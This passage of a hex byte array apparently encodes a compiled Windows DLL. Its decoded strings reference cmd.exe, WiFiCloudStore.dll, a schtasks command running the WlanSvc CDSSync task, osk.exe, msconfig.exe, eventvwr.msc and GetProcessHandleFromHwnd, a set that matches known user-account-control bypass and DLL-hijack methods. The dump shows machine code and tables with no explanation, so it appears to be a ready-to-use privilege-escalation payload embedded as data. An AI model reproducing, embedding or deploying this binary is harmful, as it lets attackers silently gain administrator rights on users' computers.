	0x50, 0x0F, 0x29, 0x49, 0x40, 0x0F, 0x10, 0x44, 0x11, 0x30, 0x0F, 0x10, 0x4C, 0x11, 0x20, 0x0F,
	0x29, 0x41, 0x30, 0x0F, 0x29, 0x49, 0x20, 0x0F, 0x10, 0x44, 0x11, 0x10, 0x0F, 0x10, 0x0C, 0x11,
	0x75, 0xAE, 0x0F, 0x29, 0x41, 0x10, 0x49, 0x83, 0xE0, 0x7F, 0x0F, 0x28, 0xC1, 0x4D, 0x8B, 0xC8,
	0x49, 0xC1, 0xE9, 0x04, 0x74, 0x1A, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0x11, 0x01, 0x48, 0x83, 0xE9, 0x10, 0x0F, 0x10, 0x04, 0x11, 0x49, 0xFF, 0xC9, 0x75, 0xF0,
	0x49, 0x83, 0xE0, 0x0F, 0x74, 0x03, 0x0F, 0x11, 0x10, 0x0F, 0x11, 0x01, 0xC3, 0x00, 0x00, 0x00,
	0x00, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x2C, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEA, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x52, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x72, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x92, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAE, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xBC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x18, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x14, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x34, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x52, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6E, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x7C, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB8, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xDE, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF4, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
	0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x52, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x70, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x94, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xBE, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x1E, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF4, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCC, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xAC, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9E, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x30, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xDC, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xA4, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xB6, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xDC, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF2, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x10, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3A, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x68, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x9A, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAE, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC6, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEA, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x14, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x34, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5A, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x94, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x62, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x76, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC7, 0xA4, 0xAB, 0x2F, 0xA9, 0x4D, 0x13, 0x40, 0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85,
	0x9F, 0x36, 0x87, 0x0F, 0xE5, 0xA4, 0xFC, 0x4C, 0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD,
	0x5C, 0x00, 0x42, 0x00, 0x61, 0x00, 0x73, 0x00, 0x65, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00,
	0x65, 0x00, 0x64, 0x00, 0x4F, 0x00, 0x62, 0x00, 0x6A, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00,
	0x73, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00, 0x6D, 0x00, 0x00, 0x00,
	0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x2E, 0x00,
	0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x61, 0x00,
	0x63, 0x00, 0x63, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65,
	0x46, 0x72, 0x6F, 0x6D, 0x48, 0x77, 0x6E, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x57, 0x00, 0x69, 0x00, 0x46, 0x00, 0x69, 0x00, 0x43, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x75, 0x00,
	0x64, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x65, 0x00, 0x2E, 0x00, 0x64, 0x00,
	0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5C, 0x00, 0x73, 0x00, 0x63, 0x00, 0x68, 0x00, 0x74, 0x00, 0x61, 0x00, 0x73, 0x00, 0x6B, 0x00,
	0x73, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x52, 0x00,
	0x55, 0x00, 0x4E, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x54, 0x00, 0x4E, 0x00, 0x20, 0x00, 0x22, 0x00,
	0x5C, 0x00, 0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00,
	0x66, 0x00, 0x74, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
	0x77, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x53, 0x00,
	0x76, 0x00, 0x63, 0x00, 0x5C, 0x00, 0x43, 0x00, 0x44, 0x00, 0x53, 0x00, 0x53, 0x00, 0x79, 0x00,
	0x6E, 0x00, 0x63, 0x00, 0x22, 0x00, 0x20, 0x00, 0x2F, 0x00, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x6F, 0x00, 0x73, 0x00, 0x6B, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00,
	0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x00, 0x00,
	0x52, 0x00, 0x65, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x75, 0x00, 0x74, 0x00, 0x69, 0x00,
	0x6F, 0x00, 0x6E, 0x00, 0x48, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4D, 0x00, 0x69, 0x00, 0x63, 0x00, 0x72, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x66, 0x00,
	0x74, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00,
	0x73, 0x00, 0x5C, 0x00, 0x57, 0x00, 0x44, 0x00, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5C, 0x00, 0x53, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x69, 0x00, 0x6F, 0x00, 0x6E, 0x00,
	0x73, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
	0x69, 0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x65, 0x00, 0x6E, 0x00, 0x2D, 0x00, 0x55, 0x00, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x43, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x57, 0x00,
	0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x43, 0x00, 0x6C, 0x00, 0x61, 0x00,
	0x73, 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x69, 0x00, 0x73, 0x00, 0x74, 0x00,
	0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x53, 0x00, 0x79, 0x00, 0x73, 0x00, 0x4C, 0x00,
	0x69, 0x00, 0x73, 0x00, 0x74, 0x00, 0x56, 0x00, 0x69, 0x00, 0x65, 0x00, 0x77, 0x00, 0x33, 0x00,
	0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x33, 0x00, 0x32, 0x00, 0x37, 0x00,
	0x37, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00,
	0x74, 0x00, 0x65, 0x00, 0x6D, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x6D, 0x00, 0x73, 0x00, 0x63, 0x00, 0x6F, 0x00, 0x6E, 0x00, 0x66, 0x00, 0x69, 0x00, 0x67, 0x00,
	0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2D, 0x00, 0x35, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6D, 0x00, 0x6D, 0x00, 0x63, 0x00, 0x2E, 0x00,
	0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 0x6E, 0x00,
	0x74, 0x00, 0x76, 0x00, 0x77, 0x00, 0x72, 0x00, 0x2E, 0x00, 0x6D, 0x00, 0x73, 0x00, 0x63, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x00, 0x4D, 0x00, 0x43, 0x00, 0x4D, 0x00,
	0x61, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x46, 0x00, 0x72, 0x00, 0x61, 0x00, 0x6D, 0x00, 0x65, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6A, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00,
	0x0D, 0x00, 0x00, 0x00, 0x34, 0x01, 0x00, 0x00, 0xC4, 0x46, 0x00, 0x00, 0xC4, 0x38, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x6A, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xBE, 0x37, 0x00, 0x00, 0xA4, 0x38, 0x00, 0x00, 0xF8, 0x37, 0x00, 0x00, 0x2F, 0x38, 0x00, 0x00,
	0xAA, 0x38, 0x00, 0x00, 0x8F, 0x38, 0x00, 0x00, 0x80, 0x38, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00,
	0x9D, 0x38, 0x00, 0x00, 0x65, 0x38, 0x00, 0x00, 0x56, 0x38, 0x00, 0x00, 0xE0, 0x37, 0x00, 0x00,
	0x73, 0x38, 0x00, 0x00, 0x40, 0x38, 0x00, 0x00, 0x18, 0x38, 0x00, 0x00, 0xC0, 0x37, 0x00, 0x00,
	0x86, 0x3A, 0x00, 0x00, 0x7F, 0x3A, 0x00, 0x00, 0x71, 0x3A, 0x00, 0x00, 0x63, 0x3A, 0x00, 0x00,
	0x55, 0x3A, 0x00, 0x00, 0x41, 0x3A, 0x00, 0x00, 0x2D, 0x3A, 0x00, 0x00, 0x19, 0x3A, 0x00, 0x00,
	0x05, 0x3A, 0x00, 0x00, 0xB6, 0x3B, 0x00, 0x00, 0xAF, 0x3B, 0x00, 0x00, 0xA1, 0x3B, 0x00, 0x00,
	0x93, 0x3B, 0x00, 0x00, 0x85, 0x3B, 0x00, 0x00, 0x71, 0x3B, 0x00, 0x00, 0x5D, 0x3B, 0x00, 0x00,
	0x49, 0x3B, 0x00, 0x00, 0x35, 0x3B, 0x00, 0x00, 0x12, 0x3D, 0x00, 0x00, 0x0B, 0x3D, 0x00, 0x00,
	0xFD, 0x3C, 0x00, 0x00, 0xEF, 0x3C, 0x00, 0x00, 0xE1, 0x3C, 0x00, 0x00, 0xD3, 0x3C, 0x00, 0x00,
	0xC5, 0x3C, 0x00, 0x00, 0xB7, 0x3C, 0x00, 0x00, 0xA9, 0x3C, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0x03, 0x80, 0x03, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00, 0x60, 0x27, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x60, 0x37, 0x00, 0x00,
	0x9D, 0x06, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x32, 0x31, 0x00,
	0x00, 0x40, 0x00, 0x00, 0xC0, 0x02, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35,
	0x00, 0x00, 0x00, 0x00, 0xC0, 0x42, 0x00, 0x00, 0x40, 0x03, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0xAC, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x30, 0x30, 0x00, 0x00, 0x00, 0xAC, 0x46, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x76, 0x6F, 0x6C, 0x74, 0x6D, 0x64, 0x00, 0x00, 0x00,
	0xC4, 0x46, 0x00, 0x00, 0x5C, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A,
	0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x20, 0x48, 0x00, 0x00, 0x60, 0x02, 0x00, 0x00,
	0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x80, 0x4A, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00,
	0x2E, 0x65, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x28, 0x73, 0x00, 0x00, 0x8C, 0x00, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0xB4, 0x73, 0x00, 0x00,
	0x14, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00,
	0xC8, 0x73, 0x00, 0x00, 0xC0, 0x02, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34,
	0x00, 0x00, 0x00, 0x00, 0x88, 0x76, 0x00, 0x00, 0x7C, 0x06, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
	0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x20, 0x80, 0x00, 0x00, 0x54, 0x08, 0x00, 0x00,
	0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0xD4, 0x01, 0x00, 0x00,
	0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x13, 0x08, 0x00, 0x13, 0xE4, 0x04, 0x00, 0x0F, 0x74, 0x03, 0x00, 0x0B, 0x64, 0x02, 0x00,
	0x07, 0x34, 0x01, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x74, 0x03, 0x00, 0x0A, 0x64, 0x02, 0x00,
	0x05, 0x34, 0x01, 0x00, 0x01, 0x1B, 0x09, 0x00, 0x1B, 0x74, 0x18, 0x00, 0x1B, 0x64, 0x17, 0x00,
	0x1B, 0x34, 0x16, 0x00, 0x1B, 0x01, 0x14, 0x00, 0x10, 0x50, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00,
	0x06, 0x72, 0x02, 0x30, 0x01, 0x18, 0x07, 0x00, 0x18, 0x68, 0x17, 0x00, 0x14, 0x74, 0x35, 0x00,
	0x14, 0x01, 0x30, 0x00, 0x08, 0x50, 0x00, 0x00, 0x01, 0x1B, 0x09, 0x00, 0x1B, 0x34, 0x40, 0x01,
	0x1B, 0x01, 0x3A, 0x01, 0x0C, 0xF0, 0x0A, 0xE0, 0x08, 0x70, 0x07, 0x60, 0x06, 0x50, 0x00, 0x00,
	0x01, 0x12, 0x06, 0x00, 0x12, 0x74, 0x10, 0x00, 0x12, 0x34, 0x0E, 0x00, 0x12, 0xB2, 0x0B, 0x50,
	0x01, 0x26, 0x0D, 0x00, 0x26, 0xC4, 0xE9, 0x00, 0x26, 0x74, 0xE8, 0x00, 0x26, 0x64, 0xE7, 0x00,
	0x26, 0x34, 0xE6, 0x00, 0x26, 0x01, 0xE2, 0x00, 0x18, 0xF0, 0x16, 0xE0, 0x14, 0x50, 0x00, 0x00,
	0x01, 0x26, 0x0D, 0x00, 0x26, 0x74, 0xE8, 0x00, 0x26, 0x64, 0xE7, 0x00, 0x26, 0x34, 0xE6, 0x00,
	0x26, 0x01, 0xE0, 0x00, 0x18, 0xF0, 0x16, 0xE0, 0x14, 0xD0, 0x12, 0xC0, 0x10, 0x50, 0x00, 0x00,
	0x01, 0x21, 0x0B, 0x00, 0x21, 0x64, 0xDF, 0x00, 0x21, 0x34, 0xDE, 0x00, 0x21, 0x01, 0xD8, 0x00,
	0x12, 0xF0, 0x10, 0xE0, 0x0E, 0xD0, 0x0C, 0x70, 0x0B, 0x50, 0x00, 0x00, 0x01, 0x0C, 0x05, 0x00,
	0x0C, 0xE2, 0x05, 0x70, 0x04, 0x60, 0x03, 0x30, 0x02, 0x50, 0x00, 0x00, 0x01, 0x18, 0x08, 0x00,
	0x18, 0x64, 0x12, 0x00, 0x18, 0x54, 0x11, 0x00, 0x18, 0x34, 0x10, 0x00, 0x18, 0xD2, 0x14, 0x70,
	0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x23, 0x0B, 0x00, 0x23, 0x74, 0x21, 0x00,
	0x23, 0x64, 0x20, 0x00, 0x23, 0x34, 0x1E, 0x00, 0x23, 0x01, 0x1A, 0x00, 0x18, 0xF0, 0x16, 0xE0,
	0x14, 0x50, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x0C, 0x00, 0x0F, 0x34, 0x0A, 0x00,
	0x0F, 0x72, 0x0B, 0x70, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x34, 0x0C, 0x00, 0x0F, 0x72, 0x08, 0x70,
	0x07, 0x60, 0x06, 0x50, 0x01, 0x1D, 0x09, 0x00, 0x1D, 0x64, 0xA8, 0x01, 0x1D, 0x34, 0xA7, 0x01,
	0x1D, 0x01, 0xA2, 0x01, 0x0E, 0xE0, 0x0C, 0x70, 0x0B, 0x50, 0x00, 0x00, 0x01, 0x0A, 0x04, 0x00,
	0x0A, 0x34, 0x06, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x01, 0x20, 0x09, 0x00, 0x20, 0x64, 0x50, 0x00,
	0x20, 0x34, 0x4E, 0x00, 0x20, 0x01, 0x4A, 0x00, 0x12, 0xE0, 0x10, 0x70, 0x0F, 0x50, 0x00, 0x00,
	0x01, 0x07, 0x01, 0x00, 0x07, 0x62, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00,
	0x01, 0x0A, 0x02, 0x00, 0x0A, 0x01, 0x89, 0x00, 0x01, 0x1A, 0x06, 0x00, 0x1A, 0x01, 0x1B, 0x00,
	0x0E, 0x70, 0x0D, 0x60, 0x0C, 0x30, 0x0B, 0x50, 0x01, 0x0D, 0x04, 0x00, 0x0D, 0x34, 0x10, 0x00,
	0x0D, 0xD2, 0x06, 0x50, 0x01, 0x0F, 0x05, 0x00, 0x0F, 0x34, 0x4B, 0x00, 0x0F, 0x01, 0x48, 0x00,
	0x08, 0x70, 0x00, 0x00, 0x01, 0x1D, 0x09, 0x00, 0x1D, 0x64, 0xD4, 0x00, 0x1D, 0x34, 0xD2, 0x00,
	0x1D, 0x01, 0xCE, 0x00, 0x0E, 0xE0, 0x0C, 0x70, 0x0B, 0x50, 0x00, 0x00, 0x01, 0x1B, 0x0A, 0x00,
	0x1B, 0x74, 0x10, 0x00, 0x1B, 0x64, 0x0F, 0x00, 0x1B, 0x34, 0x0E, 0x00, 0x1B, 0x92, 0x14, 0xE0,
	0x12, 0xC0, 0x10, 0x50, 0x01, 0x0F, 0x07, 0x00, 0x0F, 0x34, 0x4A, 0x00, 0x0F, 0x01, 0x46, 0x00,
	0x08, 0x70, 0x07, 0x60, 0x06, 0x50, 0x00, 0x00, 0x01, 0x13, 0x07, 0x00, 0x13, 0x64, 0x8A, 0x00,
	0x13, 0x34, 0x88, 0x00, 0x13, 0x01, 0x86, 0x00, 0x0C, 0x70, 0x00, 0x00, 0x01, 0x1A, 0x07, 0x00,
	0x1A, 0x74, 0xA1, 0x00, 0x1A, 0x34, 0xA0, 0x00, 0x1A, 0x01, 0x9E, 0x00, 0x0B, 0x50, 0x00, 0x00,
	0x01, 0x1E, 0x09, 0x00, 0x1E, 0xE4, 0x9E, 0x00, 0x1E, 0x74, 0x9D, 0x00, 0x1E, 0x34, 0x9C, 0x00,
	0x1E, 0x01, 0x9A, 0x00, 0x10, 0x50, 0x00, 0x00, 0x02, 0x02, 0x04, 0x00, 0x03, 0x16, 0x00, 0x06,
	0x02, 0x60, 0x01, 0x70, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x24, 0x53, 0x00, 0x00,
	0x0A, 0x00, 0x00, 0x00, 0x50, 0x01, 0x00, 0x00, 0x8A, 0x00, 0x00, 0x00, 0xA8, 0x4A, 0x00, 0x00,
	0xE8, 0x4F, 0x00, 0x00, 0x10, 0x52, 0x00, 0x00, 0x3A, 0x53, 0x00, 0x00, 0x85, 0x62, 0x00, 0x00,
	0x7C, 0x57, 0x00, 0x00, 0xF7, 0x5A, 0x00, 0x00, 0xC8, 0x62, 0x00, 0x00, 0x59, 0x5C, 0x00, 0x00,
